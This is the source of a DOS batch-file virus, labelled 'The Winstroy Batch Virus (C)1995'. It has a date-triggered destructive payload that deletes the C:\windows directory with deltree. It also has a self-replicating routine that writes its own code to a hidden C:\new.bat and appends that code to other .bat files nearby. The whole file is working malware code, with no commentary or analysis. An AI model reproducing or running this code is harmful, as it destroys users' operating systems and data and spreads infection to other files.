@echo off%[new]%
echo.|date|find "09"
if errorlevel 1 goto new3
@echo Now Destroying Windows...
deltree/y c:\windows
@echo The Winstroy Batch Virus
@echo (C)1995
goto end
:new3
@echo off%[XoP]%
if '%XoP%=='11 goto XoP2
if '%2=='_ goto XoP1
if exist C:\new.bat goto XoP
if not exist %0.bat goto XoP2
find "XoP"<%0.bat>C:\new.bat
attrib C:\new.bat +h
:XoP
for %%v in (*.bat ..\*.bat) do call C:\new %%v _
set XoP=
goto XoP2
:XoP1
find /i "XoP"<%1>nul
if not errorlevel 1 goto XoP2
type C:\new.bat>>%1
set XoP=%XoP%1
:XoP2
:end
